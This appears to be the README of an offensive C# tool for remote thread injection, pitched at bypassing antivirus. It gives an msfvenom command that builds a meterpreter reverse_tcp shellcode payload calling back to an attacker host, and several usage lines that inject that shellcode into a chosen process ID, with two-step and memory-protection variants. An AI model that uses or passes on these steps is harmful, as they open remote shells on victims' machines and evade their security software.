# NativePayload_TId
Remote Thread Injection by C# Delegate

-----------------------
Related Links for "Mitre ATT&CK": 

Process Injection: Portable Executable Injection ==>  https://attack.mitre.org/techniques/T1055/002/

Process Injection: Dynamic-link Library Injection ==> https://attack.mitre.org/techniques/T1055/001/

--------------------------
Your Payload Should be Msfvenom Payload ... 

msfvenom –platform windows –arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=w.x.y.z -f c > payload.txt
-------------------------

    Code1: NativePayload_TId.exe [TPID] [PAYLOAD]

    Code2: NativePayload_TIdnt.exe [TPID] [PAYLOAD]


    EXAMPLE: NativePayload_TId.exe 2452 "FC,48,83,00,..."

    EXAMPLE: NativePayload_TIdnt.exe 2452 "FC,48,83,00,..."
    
------------------------------------------------

Article [1]: https://damonmohammadbagher.github.io/Posts/11Feb2021x.html

Article [2]: https://www.linkedin.com/pulse/bypassing-anti-virus-creating-remote-thread-target-mohammadbagher

step by step => Chapter 14 : C# Delegate & Remote Thread Injection Technique (Part2)

https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/blob/master/CH14/Bypassing%20Anti%20Viruses%20by%20C%23.NET%20Programming%20Chapter%2014%20-Part2.pdf

------------------------------------------------

online eBook, (chapters): https://damonmohammadbagher.github.io/Posts/ebookBypassingAVsByCsharpProgramming/

------------------------------------------------

![](https://github.com/DamonMohammadbagher/NativePayload_TId/blob/main/NativePayload_TIdnt.jpeg)

------------------------------------------------

    Code1 step1: NativePayload_TId2.exe [TPID] [PAYLOAD]

    Code2 step2: NativePayload_TId3.exe [TPID] [VAx-addr or VirtualAllocEx Address from step1]


    EXAMPLE: NativePayload_TId2.exe 2452 "FC,48,83,00,..."

    EXAMPLE: NativePayload_TId3.exe 2452 1bfc0190000
    
    
step by step => Chapter 14 : C# Delegate & Remote Thread Injection Technique (Part3)

https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/blob/master/CH14/Bypassing%20Anti%20Viruses%20by%20C%23.NET%20Programming%20Chapter%2014%20-Part3.pdf

------------------------------------------------

    NativePayload_TImd.exe [steps 1 or 2] [delay 2000]  [MemoryProtection/mode 0 or 1] [TPID 4716]  [payload fc,48,..]
    
    example: NativePayload_TImd.exe  1  2000  0  4716  fc,48,56,...
    
    example: NativePayload_TImd.exe  2  6721  1  4716  fc,48,56,...
    
        step = 1  you will have 4 steps (default)
    
        step = 2  you will have 28 steps
    
        MemoryProtection = 0  API::VirtualAllocEx set to MemoryProtection.ExecuteReadWrite
    
        MemoryProtection = 1  API::VirtualAllocEx set to MemoryProtection.Execute
    

step by step => Chapter 14 : C# Delegate & Remote Thread Injection Technique (Part3)

https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/blob/master/CH14/Bypassing%20Anti%20Viruses%20by%20C%23.NET%20Programming%20Chapter%2014%20-Part3.pdf

<p><a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https://github.com/DamonMohammadbagher/NativePayload_TId"/></a></p>
